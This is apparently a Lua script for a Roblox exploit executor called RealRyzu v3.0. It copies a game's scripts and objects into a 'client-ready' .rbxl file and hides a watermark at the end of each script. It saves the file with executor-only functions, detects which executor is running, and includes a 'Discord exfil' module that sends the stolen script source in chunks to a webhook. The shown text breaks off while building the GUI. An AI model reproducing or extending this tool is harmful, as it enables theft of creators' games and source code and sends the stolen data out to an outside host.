-- RealRyzu v3.0 | CLIENT-READY RBXL EXPORTER
-- Produces clean .rbxl file — client opens, plays, publishes
-- Content placed directly in correct services, no suspicious folders
-- Watermark embedded deep in scripts, invisible to players
-- RealRyzu Development | discord.gg/realryzu

local RYZU_WATERMARK_DEEP = [[
--[[
    ██████╗ ███████╗ █████╗ ██╗     ██████╗ ██╗   ██╗███████╗██╗   ██╗
    ██╔══██╗██╔════╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝╚══███╔╝██║   ██║
    ██████╔╝█████╗  ███████║██║     ██████╔╝ ╚████╔╝   ███╔╝ ██║   ██║
    ██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██╗  ╚██╔╝   ███╔╝  ██║   ██║
    ██║  ██║███████╗██║  ██║███████╗██║  ██║   ██║   ███████╗╚██████╔╝
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝
    
    RealRyzu Development
    discord.gg/realryzu
--]]

]]

-- ============================================================
-- SERVICES
-- ============================================================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui") or (Players.LocalPlayer and Players.LocalPlayer:WaitForChild("PlayerGui"))
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local StarterPlayer = game:GetService("StarterPlayer")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local Chat = game:GetService("Chat")
local Teams = game:GetService("Teams")
local MarketplaceService = game:GetService("MarketplaceService")
local InsertService = game:GetService("InsertService")

-- ============================================================
-- CONFIGURATION
-- ============================================================
local CONFIG = {
    WatermarkEnabled = true,
    DeepWatermark = true,         -- watermark at bottom of scripts, not top
    ObfuscateWatermark = false,   -- base64 the watermark text
    CleanFolderNames = true,      -- remove "RealRyzu" from any visible names
    SavePath = "RealRyzu_Export_" .. os.time() .. ".rbxl",
    PreserveOriginal = true,      -- backup original game before modifying
    ExportLocalCopy = true,       -- save all scripts to virtual filesystem
}

-- ============================================================
-- SERVICE MAP — where everything goes in the exported rbxl
-- ============================================================
local EXPORT_TARGETS = {
    {Source = ServerScriptService,    Name = "ServerScriptService", Priority = 1},
    {Source = ReplicatedStorage,      Name = "ReplicatedStorage",   Priority = 2},
    {Source = ServerStorage,          Name = "ServerStorage",       Priority = 3},
    {Source = StarterGui,             Name = "StarterGui",          Priority = 4},
    {Source = StarterPack,            Name = "StarterPack",         Priority = 5},
    {Source = StarterPlayer,          Name = "StarterPlayer",       Priority = 6},
    {Source = Workspace,              Name = "Workspace",           Priority = 7},
    {Source = Lighting,               Name = "Lighting",            Priority = 8},
    {Source = SoundService,           Name = "SoundService",        Priority = 9},
    {Source = Chat,                   Name = "Chat",                Priority = 10},
    {Source = Teams,                  Name = "Teams",               Priority = 11},
}

-- Services that must never be touched
local PROTECTED_SERVICES = {
    "Players", "CoreGui", "CorePackages", "HttpService",
    "RunService", "UserInputService", "TeleportService",
    "MarketplaceService", "InsertService", "Stats",
    "ScriptContext", "NetworkClient", "NetworkServer",
}

-- ============================================================
-- VIRTUAL FILESYSTEM — local backup of everything
-- ============================================================
local VirtualFS = {}
VirtualFS.Files = {}
VirtualFS.TotalCount = 0
VirtualFS.TotalSize = 0

function VirtualFS:Add(path, content)
    self.Files[path] = content
    self.TotalCount = self.TotalCount + 1
    self.TotalSize = self.TotalSize + #content
end

function VirtualFS:GetManifest()
    local lines = {}
    table.insert(lines, "================================================")
    table.insert(lines, "  REALRYZU v3.0 — RBXL EXPORT MANIFEST")
    table.insert(lines, "  Game: " .. (game.PlaceId or "N/A"))
    table.insert(lines, "  Files: " .. self.TotalCount)
    table.insert(lines, "  Size: " .. string.format("%.2f MB", self.TotalSize / 1048576))
    table.insert(lines, "  Date: " .. os.date("%Y-%m-%d %H:%M:%S"))
    table.insert(lines, "================================================\n")
    
    local sorted = {}
    for path, _ in pairs(self.Files) do table.insert(sorted, path) end
    table.sort(sorted)
    
    for _, path in ipairs(sorted) do
        local sz = #self.Files[path]
        local szStr = sz > 1048576 and string.format("%.1f MB", sz/1048576)
                  or sz > 1024 and string.format("%.1f KB", sz/1024)
                  or (sz .. " B")
        table.insert(lines, "  " .. path .. " [" .. szStr .. "]")
    end
    
    return table.concat(lines, "\n")
end

-- ============================================================
-- WATERMARK INJECTOR
-- ============================================================
local WatermarkEngine = {}

function WatermarkEngine:GetWatermark()
    if not CONFIG.WatermarkEnabled then return "" end
    return RYZU_WATERMARK_DEEP
end

function WatermarkEngine:Inject(source)
    if not CONFIG.WatermarkEnabled then return source end
    if source:find("RealRyzu", 1, true) then return source end
    
    if CONFIG.DeepWatermark then
        -- Place watermark at the bottom where nobody looks
        return source .. "\n\n" .. self:GetWatermark()
    else
        -- Place at top
        return self:GetWatermark() .. "\n" .. source
    end
end

-- ============================================================
-- INSTANCE CLONER — copies everything with correct properties
-- ============================================================
local InstanceCloner = {}

-- Critical properties to copy per class
local CLASS_PROPS = {
    Script = {"Source", "Enabled", "RunContext"},
    LocalScript = {"Source", "Enabled", "RunContext"},
    ModuleScript = {"Source"},
    
    Part = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
           "Material", "Transparency", "Reflectance", "Size", "CFrame",
           "Velocity", "RotVelocity", "Massless", "RootPriority"},
    WedgePart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
                "Material", "Transparency", "Reflectance", "Size", "CFrame"},
    CornerWedgePart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
                      "Material", "Transparency", "Reflectance", "Size", "CFrame"},
    TrussPart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
                "Material", "Transparency", "Reflectance", "Size", "CFrame"},
    SpawnLocation = {"Duration", "Neutral", "TeamColor", "AllowTeamChangeOnTouch",
                    "CFrame", "Size", "Anchored", "CanCollide", "Transparency"},
    Seat = {"MaxSpeed", "Torque", "Throttle", "Steer", "Disabled"},
    VehicleSeat = {"MaxSpeed", "Torque", "Throttle", "Steer", "Disabled"},
    
    MeshPart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
               "Material", "Transparency", "Reflectance", "Size", "CFrame",
               "MeshId", "TextureID", "InitialSize"},
    UnionOperation = {"Anchored", "CanCollide", "CanTouch", "CastShadow",
                     "Material", "Transparency", "Reflectance", "Size", "CFrame",
                     "UsePartColor", "InitialSize", "AssetId"},
    NegateOperation = {"Anchored", "CanCollide", "CanTouch", "CastShadow",
                      "Material", "Transparency", "Reflectance", "Size", "CFrame",
                      "UsePartColor"},
    
    Model = {"PrimaryPart", "LevelOfDetail", "Scale"},
    Folder = {},
    Configuration = {},
    
    Humanoid = {"Health", "MaxHealth", "WalkSpeed", "JumpPower", "JumpHeight",
               "HipHeight", "AutoRotate", "PlatformStand", "DisplayDistanceType",
               "HealthDisplayDistance", "NameDisplayDistance", "NameOcclusion",
               "RequiresNeck", "RigType", "BreakJointsOnDeath"},
    AnimationController = {},
    Animator = {},
    
    Camera = {"CameraType", "FieldOfView", "CFrame", "Focus", "HeadLocked"},
    
    Tool = {"ToolTip", "RequiresHandle", "CanBeDropped", "ManualActivationOnly",
           "Enabled", "Grip", "GripForward", "GripPos", "GripRight", "GripUp",
           "TextureId"},
    HopperBin = {"BinType", "TextureId"},
    
    Sound = {"SoundId", "SoundGroup", "Volume", "Pitch", "Looped",
            "PlaybackSpeed", "PlaybackRegionsEnabled", "TimePosition",
            "EmitterSize", "RollOffMode", "RollOffMinDistance",
            "RollOffMaxDistance"},
    SoundGroup = {"Volume"},
    
    Animation = {"AnimationId"},
    
    ParticleEmitter = {"Texture", "Rate", "Lifetime", "Speed", "SpreadAngle",
                      "Color", "Size", "Transparency", "ZOffset", "Enabled",
                      "Acceleration", "Drag", "EmissionDirection", "LockedToPart",
                      "Orientation", "RotSpeed", "Shape", "Squash", "TimeScale",
                      "VelocityInheritance"},
    Trail = {"Texture", "Lifetime", "Color", "Enabled", "Length",
            "MaxLength", "MinLength", "Transparency", "WidthScale"},
    Beam = {"Texture", "Color", "Enabled", "Width0", "Width1",
           "CurveSize0", "CurveSize1", "FaceCamera", "LightEmission",
           "LightInfluence", "Segments", "TextureLength", "TextureMode",
           "TextureSpeed", "Transparency", "ZOffset"},
    Sparkles = {"SparkleColor", "Enabled"},
    Fire = {"Color", "Enabled", "Heat", "Size"},
    Smoke = {"Color", "Enabled", "Opacity", "RiseVelocity", "Size"},
    Explosion = {"BlastRadius", "DestroyJointRadiusPercent", "BlastPressure",
                "Position", "Visible", "ExplosionType"},
    
    Attachment = {"Position", "Rotation", "Axis", "Visible"},
    Bone = {"Position", "Rotation"},
    Skeleton = {},
    
    ScreenGui = {"Enabled", "ResetOnSpawn", "ZIndexBehavior", "DisplayOrder",
                "IgnoreGuiInset", "SafeAreaCompatibility", "ScreenInsets"},
    SurfaceGui = {"Enabled", "Active", "AlwaysOnTop", "CanvasSize",
                 "ClipsDescendants", "Face", "LightInfluence", "PixelsPerStud",
                 "SizingMode", "ZOffset"},
    BillboardGui = {"Enabled", "Active", "AlwaysOnTop", "CanvasSize",
                   "ClipsDescendants", "DistanceLowerLimit", "DistanceUpperLimit",
                   "LightInfluence", "MaxDistance", "Size", "StudsOffset",
                   "StudsOffsetWorldSpace", "PlayerToHideFrom"},
    
    Frame = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
            "BorderMode", "BorderSizePixel", "ClipsDescendants", "Position",
            "Rotation", "Size", "Visible", "ZIndex", "Active", "AnchorPoint",
            "AutomaticSize", "LayoutOrder"},
    TextLabel = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                "BorderMode", "BorderSizePixel", "Font", "FontFace",
                "LineHeight", "MaxVisibleGraphemes", "RichText", "Text",
                "TextColor3", "TextScaled", "TextSize", "TextStrokeColor3",
                "TextStrokeTransparency", "TextTransparency", "TextTruncate",
                "TextWrapped", "TextXAlignment", "TextYAlignment"},
    TextButton = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                 "BorderMode", "BorderSizePixel", "Font", "FontFace",
                 "LineHeight", "MaxVisibleGraphemes", "RichText", "Text",
                 "TextColor3", "TextScaled", "TextSize", "TextStrokeColor3",
                 "TextStrokeTransparency", "TextTransparency", "TextTruncate",
                 "TextWrapped", "TextXAlignment", "TextYAlignment",
                 "AutoButtonColor", "Modal", "Selected"},
    TextBox = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
              "BorderMode", "BorderSizePixel", "Font", "FontFace",
              "LineHeight", "MaxVisibleGraphemes", "RichText", "Text",
              "TextColor3", "TextScaled", "TextSize", "TextStrokeColor3",
              "TextStrokeTransparency", "TextTransparency", "TextTruncate",
              "TextWrapped", "ClearTextOnFocus", "MultiLine", "PlaceholderText",
              "PlaceholderColor3", "ShowNativeInput", "TextEditable"},
    ImageLabel = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                 "BorderMode", "BorderSizePixel", "Image", "ImageColor3",
                 "ImageRectOffset", "ImageRectSize", "ImageTransparency",
                 "ResampleMode", "ScaleType", "SliceCenter", "SliceScale",
                 "TileSize"},
    ImageButton = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                  "BorderMode", "BorderSizePixel", "Image", "ImageColor3",
                  "ImageRectOffset", "ImageRectSize", "ImageTransparency",
                  "ResampleMode", "ScaleType", "SliceCenter", "SliceScale",
                  "TileSize", "AutoButtonColor", "Modal", "Selected"},
    ViewportFrame = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                    "BorderMode", "BorderSizePixel", "ImageColor3",
                    "ImageTransparency", "Ambient", "LightColor", "LightDirection"},
    CanvasGroup = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                  "BorderMode", "BorderSizePixel", "GroupColor3", "GroupTransparency"},
    ScrollingFrame = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                     "BorderMode", "BorderSizePixel", "CanvasPosition",
                     "CanvasSize", "ElasticBehavior", "HorizontalScrollBarInset",
                     "ScrollBarImageColor3", "ScrollBarImageTransparency",
                     "ScrollBarThickness", "ScrollingDirection", "ScrollingEnabled",
                     "VerticalScrollBarInset", "VerticalScrollBarPosition"},
    
    VideoFrame = {"Video", "Looped", "Playing", "Volume"},
    
    UICorner = {"CornerRadius"},
    UIGradient = {"Color", "Transparency", "Rotation", "Enabled"},
    UIAspectRatioConstraint = {"AspectRatio", "DominantAxis", "AspectType"},
    UISizeConstraint = {"MinSize", "MaxSize"},
    UITextSizeConstraint = {"MaxTextSize", "MinTextSize"},
    UIGridLayout = {"CellPadding", "CellSize", "FillDirection", "FillDirectionMaxCells",
                   "HorizontalAlignment", "SortOrder", "StartCorner", "VerticalAlignment"},
    UIListLayout = {"FillDirection", "HorizontalAlignment", "Padding",
                   "SortOrder", "VerticalAlignment", "Wraps"},
    UIPageLayout = {"Circular", "EasingDirection", "EasingStyle", "GamepadInputEnabled",
                   "Padding", "SortOrder", "TweenTime", "Animated"},
    UITableLayout = {"FillDirection", "HorizontalAlignment", "MajorAxis",
                    "Padding", "SortOrder", "VerticalAlignment"},
    UIPadding = {"PaddingBottom", "PaddingLeft", "PaddingRight", "PaddingTop"},
    UIScale = {"Scale"},
    UIStroke = {"Color", "Thickness", "Transparency", "ApplyStrokeMode",
               "Enabled", "LineJoinMode"},
    
    Decal = {"Texture", "Transparency", "Color3", "Face", "Shiny", "Specular"},
    Texture = {"Texture", "Transparency", "Color3", "Face", "StudsPerTileU",
              "StudsPerTileV", "OffsetStudsU", "OffsetStudsV"},
    
    PointLight = {"Brightness", "Color", "Enabled", "Range", "Shadows"},
    SpotLight = {"Angle", "Brightness", "Color", "Enabled", "Face", "Range", "Shadows"},
    SurfaceLight = {"Angle", "Brightness", "Color", "Enabled", "Face", "Range", "Shadows"},
    
    WeldConstraint = {"Enabled", "Part0", "Part1"},
    Motor6D = {"DesiredAngle", "MaxVelocity", "CurrentAngle", "Transform", "Enabled"},
    
    HingeConstraint = {"ActuatorType", "AngularSpeed", "CurrentAngle",
                      "LimitsEnabled", "LowerAngle", "MotorMaxAcceleration",
                      "MotorMaxTorque", "Radius", "Restitution", "ServoMaxTorque",
                      "TargetAngle", "UpperAngle", "Enabled"},
    SpringConstraint = {"Coils", "Damping", "FreeLength", "LimitsEnabled",
                       "MaxForce", "MaxLength", "MinLength", "Radius",
                       "Stiffness", "Thickness", "Enabled"},
    RopeConstraint = {"Length", "CurrentDistance", "Enabled", "Restitution",
                     "Thickness", "WinchEnabled", "WinchForce", "WinchSpeed",
                     "WinchTarget"},
    RodConstraint = {"Length", "CurrentDistance", "Enabled", "Thickness"},
    
    AlignPosition = {"Mode", "MaxForce", "MaxVelocity", "ReactionForceEnabled",
                    "Responsiveness", "RigidityEnabled", "Enabled"},
    AlignOrientation = {"Mode", "MaxAngularVelocity", "MaxTorque",
                       "ReactionTorqueEnabled", "Responsiveness", "RigidityEnabled", "Enabled"},
    
    VectorForce = {"Force", "ApplyAtCenterOfMass", "Enabled", "RelativeTo"},
    Torque = {"Torque", "Enabled", "RelativeTo"},
    BodyForce = {"Force", "Enabled"},
    BodyVelocity = {"Velocity", "Enabled", "MaxForce", "P"},
    BodyPosition = {"Position", "Enabled", "MaxForce", "P", "D"},
    BodyGyro = {"CFrame", "Enabled", "MaxTorque", "P", "D"},
    BodyThrust = {"Force", "Enabled", "Location"},
    BodyAngularVelocity = {"AngularVelocity", "Enabled", "MaxTorque", "P"},
    RocketPropulsion = {"CartoonFactor", "Enabled", "MaxSpeed", "MaxThrust",
                       "MaxTorque", "Target", "TargetOffset", "TargetRadius",
                       "ThrustD", "ThrustP", "TurnD", "TurnP"},
    
    ProximityPrompt = {"ActionText", "AutoLocalize", "ClickablePrompt",
                      "Enabled", "Exclusivity", "GamepadKeyCode",
                      "HoldDuration", "KeyboardKeyCode", "MaxActivationDistance",
                      "ObjectText", "RequiresLineOfSight", "RootLocalizationTable",
                      "Style", "TriggerEnded", "TriggerOffset"},
    ClickDetector = {"CursorIcon", "Enabled", "MaxActivationDistance"},
    DragDetector = {"ApplyAtCenterOfMass", "Axis", "DragFrame",
                   "DragStyle", "Enabled", "GamepadMode", "KeyboardMode",
                   "MaxDragAngle", "MaxDragTranslation", "MaxForce",
                   "MinDragAngle", "MinDragTranslation", "MouseMode",
                   "PermittedAxes", "PullTowardCenter", "ReferenceInstance",
                   "ResponseStyle", "RunLocally", "SelectionMode",
                   "TrackballRadialPullFactor", "TrackballRollFactor",
                   "TouchMode", "VREnabled", "VRMode"},
    
    Dialog = {"ConversationDistance", "Enabled", "GoodbyeChoiceActive",
             "GoodbyeDialog", "InUse", "InitialPrompt", "Purpose",
             "TriggerOffset", "Tone"},
    DialogChoice = {"GoodbyeChoiceActive", "GoodbyeDialog", "ResponseDialog",
                   "UserDialog"},
    
    RemoteEvent = {},
    RemoteFunction = {},
    BindableEvent = {},
    BindableFunction = {},
    CustomEvent = {},
    CustomEventReceiver = {},
    
    StringValue = {"Value"},
    IntValue = {"Value"},
    NumberValue = {"Value"},
    BoolValue = {"Value"},
    ObjectValue = {"Value"},
    BrickColorValue = {"Value"},
    CFrameValue = {"Value"},
    Color3Value = {"Value"},
    Vector3Value = {"Value"},
    
    BodyColors = {"HeadColor3", "TorsoColor3", "LeftArmColor3",
                 "RightArmColor3", "LeftLegColor3", "RightLegColor3"},
    Shirt = {"ShirtTemplate", "Color3"},
    Pants = {"PantsTemplate", "Color3"},
    ShirtGraphic = {"Graphic", "Color3"},
    
    BlockMesh = {"Scale", "Offset", "VertexColor"},
    CylinderMesh = {"Scale", "Offset", "VertexColor"},
    SpecialMesh = {"Scale", "Offset", "VertexColor", "MeshId", "MeshType", "TextureId"},
    FileMesh = {"Scale", "Offset", "VertexColor", "MeshId", "TextureId"},
    
    SelectionBox = {"Adornee", "Color", "LineThickness", "SurfaceColor",
                   "SurfaceTransparency", "Transparency", "Visible"},
    SelectionSphere = {"Adornee", "Color", "LineThickness", "SurfaceColor",
                      "SurfaceTransparency", "Transparency", "Visible"},
    
    ForceField = {"Visible"},
    Highlight = {"Adornee", "DepthMode", "Enabled", "FillColor",
                "FillTransparency", "OutlineColor", "OutlineTransparency"},
    
    HumanoidDescription = {"BackAccessory", "BodyTypeScale", "ClimbAnimation",
                          "DepthScale", "Face", "FaceAccessory", "FallAnimation",
                          "FrontAccessory", "GraphicTShirt", "HairAccessory",
                          "HatAccessory", "Head", "HeadColor", "HeadScale",
                          "HeightScale", "IdleAnimation", "JumpAnimation",
                          "LeftArm", "LeftArmColor", "LeftLeg", "LeftLegColor",
                          "NeckAccessory", "NumberOfPlayers", "Pants",
                          "ProportionScale", "RightArm", "RightArmColor",
                          "RightLeg", "RightLegColor", "RunAnimation",
                          "Shirt", "ShouldersAccessory", "SwimAnimation",
                          "Torso", "TorsoColor", "WaistAccessory",
                          "WalkAnimation", "WidthScale"},
    
    Team = {"AutoAssignable", "AutoColorCharacters", "TeamColor"},
    
    WrapTarget = {"CageMeshId", "HSRAssetId", "Stiffness"},
    WrapLayer = {"Enabled", "HSRAssetId", "Order", "ReferenceMeshId",
                "ShrinkFactor", "Stiffness"},
    
    Sky = {"CelestialBodiesShown", "MoonAngularSize", "MoonTextureId",
          "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt",
          "SkyboxUp", "StarCount", "SunAngularSize", "SunTextureId"},
    Atmosphere = {"Density", "Glare", "Haze", "Color", "Decay", "Glow", "Offset"},
    BloomEffect = {"Enabled", "Intensity", "Size", "Threshold"},
    BlurEffect = {"Enabled", "Size"},
    ColorCorrectionEffect = {"Brightness", "Contrast", "Enabled", "Saturation", "TintColor"},
    DepthOfFieldEffect = {"Enabled", "FarIntensity", "FocusDistance",
                         "InFocusRadius", "NearIntensity"},
    SunRaysEffect = {"Enabled", "Intensity", "Spread"},
}

function InstanceCloner:CanClone(obj)
    if not obj or not obj.ClassName then return false end
    if obj:IsA("ServiceProvider") and PROTECTED_SERVICES[obj.ClassName] then return false end
    if obj.ClassName:find("^Network") then return false end
    if obj.ClassName:find("^ScriptContext") then return false end
    if obj:IsA("ScreenGui") and obj:GetFullName():find("CoreGui") then return false end
    if obj:IsDescendantOf(Players) and not obj:IsA("Player") then return false end
    if obj:IsA("Terrain") then return false end
    return true
end

function InstanceCloner:DeepClone(original, destParent, virtualFS, pathPrefix)
    if not self:CanClone(original) then return nil end
    
    local instancePath = (pathPrefix or "") .. "/" .. original.Name
    local className = original.ClassName
    
    local cloned = nil
    
    local success = pcall(function()
        -- Handle scripts specially
        if className == "Script" or className == "LocalScript" or className == "ModuleScript" then
            cloned = Instance.new(className)
            cloned.Name = original.Name
            
            local src = ""
            pcall(function() src = original.Source end)
            
            if CONFIG.WatermarkEnabled then
                if not src:find("RealRyzu", 1, true) then
                    src = WatermarkEngine:Inject(src)
                end
            end
            
            pcall(function() cloned.Source = src end)
            
            -- Copy other props
            pcall(function() cloned.Enabled = original.Enabled end)
            pcall(function() cloned.RunContext = original.RunContext end)
            pcall(function() cloned.LinkedSource = original.LinkedSource end)
            
            -- Save to virtual FS
            if virtualFS then
                local ext = className == "ModuleScript" and ".module.lua"
                        or className == "LocalScript" and ".client.lua"
                        or ".server.lua"
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:Add("RealRyzu_Export/Scripts/" .. safe .. ext, src)
            end
            
        elseif CLASS_PROPS[className] then
            cloned = Instance.new(className)
            cloned.Name = original.Name
            
            for _, prop in ipairs(CLASS_PROPS[className]) do
                pcall(function()
                    local val = original[prop]
                    if val ~= nil then
                        cloned[prop] = val
                    end
                end)
            end
            
        else
            -- Generic clone fallback
            cloned = original:Clone()
        end
        
        if cloned then
            cloned.Parent = destParent
            
            -- Recurse children
            for _, child in ipairs(original:GetChildren()) do
                self:DeepClone(child, cloned, virtualFS, instancePath)
            end
        end
    end)
    
    return cloned
end

-- ============================================================
-- ORIGINAL CONTENT BACKUP SYSTEM
-- ============================================================
local ContentBackup = {}
ContentBackup.Stored = {}

function ContentBackup:Store(servicesList)
    self.Stored = {}
    for _, target in ipairs(servicesList) do
        local serviceData = {
            Name = target.Name,
            Service = target.Source,
            Children = {},
        }
        for _, child in ipairs(target.Source:GetChildren()) do
            if InstanceCloner:CanClone(child) then
                table.insert(serviceData.Children, child)
            end
        end
        self.Stored[target.Name] = serviceData
    end
end

function ContentBackup:ClearServices(servicesList)
    for _, target in ipairs(servicesList) do
        for _, child in ipairs(target.Source:GetChildren()) do
            if InstanceCloner:CanClone(child) then
                pcall(function() child.Parent = nil end)
            end
        end
    end
end

function ContentBackup:Restore()
    for svcName, data in pairs(self.Stored) do
        for _, child in ipairs(data.Children) do
            pcall(function()
                if child and child.Parent == nil then
                    child.Parent = data.Service
                end
            end)
        end
    end
    self.Stored = {}
end

-- ============================================================
-- SAVEINSTANCE WRAPPER
-- ============================================================
local SaveManager = {}

function SaveManager:SaveToFile(filename)
    local success = false
    local filePath = ""
    
    -- Try multiple save methods
    if saveinstance then
        pcall(function()
            saveinstance({filename = filename, mode = "optimized"})
            success = true
            filePath = filename
        end)
    end
    
    if not success and writefile then
        -- Some executors have writefile but not saveinstance
        pcall(function()
            local placeData = game:GetService("DataModel"):SavePlace()
            writefile(filename, placeData)
            success = true
            filePath = filename
        end)
    end
    
    if not success then
        -- Last resort: try saveinstance without options
        pcall(function()
            saveinstance()
            success = true
            filePath = "place.rbxl"
        end)
    end
    
    return success, filePath
end

-- ============================================================
-- EXECUTOR DETECTOR
-- ============================================================
local function DetectExecutor()
    local env = getgenv and getgenv() or _G
    if syn and syn.protect_gui then return "Synapse X", 99 end
    if KRNL_LOADED or iskrnlclosure then return "KRNL", 95 end
    if fluxus and fluxus.getbytecode then return "Fluxus", 90 end
    if electron and electron.execute then return "Electron", 85 end
    if getexecutorname then
        local name = pcall(getexecutorname) and getexecutorname() or nil
        if name then return name, 80 end
    end
    
    -- Scan for markers
    local markers = {"synapse", "krnl", "scriptware", "fluxus", "electron",
                    "arceus", "hydrogen", "codex", "delta", "vega", "solara",
                    "wave", "celery", "nihon", "jjsploit", "comet", "valyse"}
    for _, m in ipairs(markers) do
        if rawget(env, m) or rawget(_G, m) then
            return m:sub(1,1):upper() .. m:sub(2), 50
        end
    end
    
    return "Unknown Executor", 0
end

-- ============================================================
-- DISCORD EXFIL (optional backup)
-- ============================================================
local DiscordExfil = {}
DiscordExfil.URL = ""
DiscordExfil.ChunkSize = 1900
DiscordExfil.Sent = 0
DiscordExfil.Bytes = 0
DiscordExfil.Last = 0

function DiscordExfil:Set(url)
    if url and url:match("discord%.com/api/webhooks") then
        self.URL = url; return true
    end
    return false
end

function DiscordExfil:SendChunk(data, name)
    if self.URL == "" then return false end
    local wait = 0.55 - (tick() - self.Last)
    if wait > 0 then task.wait(wait) end
    
    local payload = {
        content = "```lua\n-- RealRyzu | " .. (name or "file") .. "\n" .. data:sub(1, 1850) .. "\n```",
        username = "RealRyzu v3.0",
    }
    
    local ok = pcall(function()
        return HttpService:PostAsync(self.URL, HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson, false)
    end)
    
    self.Last = tick()
    if ok then self.Sent = self.Sent + 1; self.Bytes = self.Bytes + #data end
    return ok
end

function DiscordExfil:SendLarge(data, name)
    local chunks = math.ceil(#data / self.ChunkSize)
    for i = 1, chunks do
        local s = (i-1)*self.ChunkSize + 1
        local e = math.min(i*self.ChunkSize, #data)
        self:SendChunk(data:sub(s, e), name .. " [" .. i .. "/" .. chunks .. "]")
        if i < chunks then task.wait(0.6) end
    end
end

-- ============================================================
-- GUI CONSTRUCTION
-- ============================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RealRyzu_v3"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 660, 0, 440)
Main.Position = UDim2.new(0.5, -330, 0.5, -220)
Main.BackgroundColor3 = Color3.fromRGB(4, 4, 10)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

-- Glow
local Glow = Instance.new("Frame")
Glow.Size = UDim2.new(1, 8, 1, 8)
Glow.Position = UDim2.new(0, -4, 0, -4)
Glow.BackgroundTransparency = 1
Glow.BorderSizePixel = 0
Glow.Parent = Main

for _, e in ipairs({"Top","Bottom","Left","Right"}) do
    local b = Instance.new("Frame")
    if e == "Top" or e == "Bottom" then
        b.Size = UDim2.new(1, 0, 0, 3)
        if e == "Bottom" then b.Position = UDim2.new(0, 0, 1, 0) end
    else
        b.Size = UDim2.new(0, 3, 1, 0)
        if e == "Right" then b.Position = UDim2.new(1, 0, 0, 0) end
    end
    b.BackgroundColor3 = e == "Top" and Color3.fromRGB(0, 220, 255) or Color3.fromRGB(0, 170, 220)
    b.BorderSizePixel = 0
    b.Parent = Glow
end

-- Title
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 46)
TitleBar.BackgroundColor3 = Color3.fromRGB(7, 7, 17)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = Main

local TitleIcon = Instance.new("TextLabel")
TitleIcon.Text = "⬡"
TitleIcon.Size = UDim2.new(0, 32, 0, 32)
TitleIcon.Position = UDim2.new(0, 10, 0, 7)
TitleIcon.BackgroundTransparency = 1
TitleIcon.TextColor3 = Color3.fromRGB(0, 220, 255)
TitleIcon.Font = Enum.Font.Code
TitleIcon.TextSize = 24
TitleIcon.Parent = TitleBar

local TitleText = Instance.new("TextLabel")
TitleText.Text = "REALRYZU v3.0"
TitleText.Size = UDim2.new(0, 200, 0, 20)
TitleText.Position = UDim2.new(0, 48, 0, 4)
TitleText.BackgroundTransparency = 1
TitleText.TextColor3 = Color3.fromRGB(240, 240, 255)
TitleText.Font = Enum.Font.Code
TitleText.TextSize = 16
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Parent = TitleBar

local SubText = Instance.new("TextLabel")
SubText.Text = "CLIENT-READY RBXL EXPORTER"
SubText.Size = UDim2.new(0, 250, 0, 14)
SubText.Position = UDim2.new(0, 48, 0, 26)
SubText.BackgroundTransparency = 1
SubText.TextColor3 = Color3.fromRGB(0, 185, 230)
SubText.Font = Enum.Font.Code
SubText.TextSize = 9
SubText.TextXAlignment = Enum.TextXAlignment.Left
SubText.Parent = TitleBar

local ExecText = Instance.new("TextLabel")
ExecText.Size = UDim2.new(0, 200, 0, 14)
ExecText.Position = UDim2.new(1, -260, 0, 4)
ExecText.BackgroundTransparency = 1
ExecText.TextColor3 = Color3.fromRGB(110, 220, 110)
ExecText.Font = Enum.Font.Code
ExecText.TextSize = 9
ExecText.TextXAlignment = Enum.TextXAlignment.Right
ExecText.Text = "Executor: Detecting..."
ExecText.Parent = TitleBar

local GameText = Instance.new("TextLabel")
GameText.Size = UDim2.new(0, 200, 0, 14)
GameText.Position = UDim2.new(1, -260, 0, 22)
GameText.BackgroundTransparency = 1
GameText.TextColor3 = Color3.fromRGB(140, 140, 165)
GameText.Font = Enum.Font.Code
GameText.TextSize = 8
GameText.TextXAlignment = Enum.TextXAlignment.Right
GameText.Text = "Game: " .. (game.PlaceId or "N/A")
GameText.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "×"
